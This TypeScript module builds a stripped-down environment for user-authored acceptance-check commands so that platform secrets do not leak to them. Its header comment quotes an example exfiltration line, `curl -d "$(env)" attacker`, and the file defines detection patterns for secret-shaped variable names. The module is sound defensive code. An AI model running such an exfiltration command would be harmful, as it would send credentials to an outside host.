import { homedir, tmpdir } from 'os';

/**
 * Quality gates — the environment an acceptance-check subprocess runs with.
 *
 * SECURITY (why this module exists): a check `command` is user-authored
 * input (Work members with Task/settings rights write it, and an agent can
 * propose it), and it is executed through the platform shell in the run's
 * checkout. Spawning it with the inherited process environment therefore
 * handed every check `DATABASE_*`, `PLATFORM_ENCRYPTION_KEY`,
 * `AUTH_SECRET`, `TRIGGER_*`, every plugin API key… — `test: env > out.txt`
 * or `curl -d "$(env)" attacker` was a complete platform-secret exfiltration
 * primitive.
 *
 * The child env is therefore built FROM SCRATCH:
 *   1. a fixed allowlist of what a build/test command legitimately needs
 *      (`PATH`, `HOME`/`USERPROFILE`, locale, temp dirs, the Windows
 *      essentials, toolchain roots) — read out of the parent env by name;
 *   2. the check's own `envPassthrough` names — deliberate, per-check
 *      grants, still refused for platform-owned configuration;
 *   3. a belt-and-braces sweep that drops any secret-shaped NAME or
 *      credential-bearing URL value that reached the map WITHOUT being an
 *      explicit grant, so widening the allowlist can never silently
 *      reintroduce the leak.
 *
 * Same posture as the coding-agent CLI runners' `subprocess-env.ts`
 * helpers under `packages/plugins` (audit finding C-10).
 */

/**
 * Environment variables every check subprocess may see, by name.
 *
 * The rule for adding one: it must be needed to RESOLVE AND RUN commands
 * (interpreter/toolchain discovery, locale, temp space) and must not carry
 * credentials. Lookups are case-insensitive, so the Windows spellings
 * (`Path`, `TEMP`) match these entries.
 */
export const CHECK_ENV_ALLOWLIST: readonly string[] = [
    // POSIX essentials
    'PATH',
    'HOME',
    'SHELL',
    'USER',
    'LOGNAME',
    'TERM',
    'TZ',
    'TMPDIR',
    'LANG',
    'LANGUAGE',
    'XDG_CACHE_HOME',
    'XDG_CONFIG_HOME',
    'XDG_DATA_HOME',
    // Windows essentials — cmd.exe and most toolchains refuse to start
    // without these.
    'SystemRoot',
    'SystemDrive',
    'ComSpec',
    'PATHEXT',
    'windir',
    'TEMP',
    'TMP',
    'USERPROFILE',
    'HOMEDRIVE',
    'HOMEPATH',
    'APPDATA',
    'LOCALAPPDATA',
    'ALLUSERSPROFILE',
    'PROGRAMDATA',
    'PROGRAMFILES',
    'PROGRAMFILES(X86)',
    'COMMONPROGRAMFILES',
    'PUBLIC',
    'USERNAME',
    'COMPUTERNAME',
    'NUMBER_OF_PROCESSORS',
    'PROCESSOR_ARCHITECTURE',
    'OS',
    // Runtime / toolchain roots. Locations, not credentials.
    'NODE_ENV',
    'NODE_VERSION',
    'NODE_OPTIONS',
    'NODE_EXTRA_CA_CERTS',
    'NVM_DIR',
    'NVM_BIN',
    'VOLTA_HOME',
    'COREPACK_HOME',
    'PNPM_HOME',
    'BUN_INSTALL',
    'JAVA_HOME',
    'GOPATH',
    'GOROOT',
    'CARGO_HOME',
    'RUSTUP_HOME',
    'DOTNET_ROOT',
    'VIRTUAL_ENV',
    'PYENV_ROOT',
    // Network plumbing a real build needs behind a proxy / private CA.
    // Credential-bearing values are stripped by the sweep below.
    'HTTP_PROXY',
    'HTTPS_PROXY',
    'ALL_PROXY',
    'NO_PROXY',
    'SSL_CERT_FILE',
    'SSL_CERT_DIR',
    'REQUESTS_CA_BUNDLE',
    'CURL_CA_BUNDLE',
    // Non-interactive marker; see CHECK_ENV_DEFAULTS.
    'CI',
];

/**
 * Allowlisted NAME PREFIXES. Only the POSIX locale family, whose members
 * (`LC_ALL`, `LC_CTYPE`, …) are open-ended by design.
 */
export const CHECK_ENV_ALLOWED_PREFIXES: readonly string[] = ['LC_'];

/**
 * Values injected when the parent env does not provide them. `CI=1` is what
 * a headless gate wants: it turns off watch modes and interactive prompts
 * that would otherwise hang a check until its timeout.
 */
export const CHECK_ENV_DEFAULTS: Readonly<Record<string, string>> = { CI: '1' };

/**
 * Secret-shaped variable names. Anything matching is dropped from the child
 * env unless the check named it in `envPassthrough` — belt and braces
 * against a future allowlist entry (or an injected default) that quietly
 * carries a credential.
 */
export const SECRETISH_ENV_KEY_PATTERN =
    /(SECRET|TOKEN|KEY|PASSWORD|PASSWD|CREDENTIAL|DSN|DATABASE_URL|CONNECTION)/i;

/**
 * Platform-owned configuration namespaces. These are NEVER grantable — not
 * by the allowlist, not by an explicit `envPassthrough` — because they are
 * the platform's own credentials, not the Work's. Without this, the opt-in
 * escape hatch would re-open the very hole this module closes
 * (`envPassthrough: ['PLATFORM_ENCRYPTION_KEY']`).
 */
export const PLATFORM_OWNED_ENV_PATTERN =
    /^(DATABASE_|PLATFORM_|PLUGIN_|TRIGGER_|AUTH_|BETTER_AUTH_|EVER_WORKS_|SMTP_|RESEND_|MAILER_|STRIPE_|SENTRY_|POSTHOG_|JITSU_|TWENTY_CRM_|K8S_|STORAGE_|AWS_|REDIS_|S3_|MINIO_|GH_|GOOGLE_|FACEBOOK_|LINKEDIN_)/i;

/**
 * Shape a passthrough NAME must have to be honored. Anything else (spaces,
 * `=`, shell metacharacters, empty) is ignored rather than rejected — a
 * malformed entry must not fail an otherwise healthy check.
 */
export const ENV_NAME_PATTERN = /^[A-Za-z_][A-Za-z0-9_]{0,127}$/;

/** Upper bound on how many names one check may grant. */
export const MAX_ENV_PASSTHROUGH = 32;

/**
 * A URL carrying `user:password@` in its authority. Allowlisted values that
 * look like this (a credentialed proxy URL, typically) are dropped: the
 * variable is plumbing, the password inside it is not ours to hand over.
 */
const CREDENTIALED_URL_PATTERN = /[a-z][a-z0-9+.-]*:\/\/[^/\s@]*:[^/\s@]+@/i;

export interface BuildCheckEnvOptions {
    /**
     * Names the check explicitly opted into (`TaskAcceptanceCheck.envPassthrough`).
     * Names only — values are read from the parent env at spawn time.
     */
    passthrough?: readonly string[] | null;
    /** Environment to select from. Defaults to `process.env`. */
    parentEnv?: NodeJS.ProcessEnv;
    /** Allowlist override (tests / future per-runtime tuning). */
    allowlist?: readonly string[];
}

/**
 * Build the environment for one acceptance-check subprocess.
 *
 * Never returns the parent environment, a copy of it, or a spread of it —
 * only the allowlisted names, the explicit grants, and the defaults.
 */
export function buildCheckEnv(options: BuildCheckEnvOptions = {}): Record<string, string> {
    const parentEnv = options.parentEnv ?? process.env;
    const allowlist = options.allowlist ?? CHECK_ENV_ALLOWLIST;

    // Windows env names are case-insensitive (`Path` vs `PATH`), so index
    // the parent once by upper-cased name and look everything up through it.
    const byUpperName = new Map<string, string>();
    for (const key of Object.keys(parentEnv)) {
        const upper = key.toUpperCase();
        if (!byUpperName.has(upper)) byUpperName.set(upper, key);
    }
    const readParent = (name: string): { key: string; value: string } | null => {
        const key = byUpperName.get(name.toUpperCase());
        if (key === undefined) return null;
        const value = parentEnv[key];
        return typeof value === 'string' ? { key, value } : null;
    };

    const env: Record<string, string> = {};

    // 1. Allowlisted names, then the open-ended locale family.
    for (const name of allowlist) {
        const found = readParent(name);
        if (found && isSafeInheritedValue(found.key, found.value)) {
            env[found.key] = found.value;
        }
    }
    for (const [upper, key] of byUpperName) {
        if (!CHECK_ENV_ALLOWED_PREFIXES.some((prefix) => upper.startsWith(prefix.toUpperCase()))) {
            continue;
        }
        const value = parentEnv[key];
        if (typeof value === 'string' && isSafeInheritedValue(key, value)) {
            env[key] = value;
        }
    }

    // 2. Explicit per-check grants. These bypass the secret-name sweep (a
    //    listed name IS the grant) but never the platform-owned refusal.
    for (const name of normalizePassthrough(options.passthrough)) {
        const found = readParent(name);
        if (found) env[found.key] = found.value;
    }

    // 3. Defaults for anything the parent did not supply, plus the PATH
    //    floor — a check whose commands cannot be resolved is useless.
    for (const [name, value] of Object.entries(CHECK_ENV_DEFAULTS)) {
        if (byUpperNameHas(env, name) === false) {
            env[name] = value;
        }
    }
    // A PATH-less POSIX child cannot resolve `pnpm`/`node` at all; on
    // Windows an absent PATH is left absent (cmd.exe has its own fallback,
    // and an empty PATH would be worse than none).
    if (byUpperNameHas(env, 'PATH') === false && process.platform !== 'win32') {
        env.PATH = '/usr/local/bin:/usr/bin:/bin';
    }
    if (byUpperNameHas(env, 'HOME') === false && byUpperNameHas(env, 'USERPROFILE') === false) {
        env.HOME = homedir();
    }
    if (
        byUpperNameHas(env, 'TMPDIR') === false &&
        byUpperNameHas(env, 'TEMP') === false &&
        byUpperNameHas(env, 'TMP') === false
    ) {
        env.TMPDIR = tmpdir();
    }

    return env;
}

/**
 * The names a check actually granted: shape-valid, de-duplicated, capped,
 * and never platform-owned configuration.
 */
export function normalizePassthrough(names: readonly string[] | null | undefined): string[] {
    if (!Array.isArray(names)) return [];
    const out: string[] = [];
    const seen = new Set<string>();
    for (const raw of names) {
        if (typeof raw !== 'string') continue;
        const name = raw.trim();
        if (!ENV_NAME_PATTERN.test(name)) continue;
        if (PLATFORM_OWNED_ENV_PATTERN.test(name)) continue;
        const upper = name.toUpperCase();
        if (seen.has(upper)) continue;
        seen.add(upper);
        out.push(name);
        if (out.length >= MAX_ENV_PASSTHROUGH) break;
    }
    return out;
}

/** Guard applied to everything that is NOT an explicit grant. */
function isSafeInheritedValue(name: string, value: string): boolean {
    if (SECRETISH_ENV_KEY_PATTERN.test(name)) return false;
    if (PLATFORM_OWNED_ENV_PATTERN.test(name)) return false;
    return !CREDENTIALED_URL_PATTERN.test(value);
}

/** Case-insensitive membership test against an env map being built. */
function byUpperNameHas(env: Record<string, string>, name: string): boolean {
    const upper = name.toUpperCase();
    return Object.keys(env).some((key) => key.toUpperCase() === upper);
}
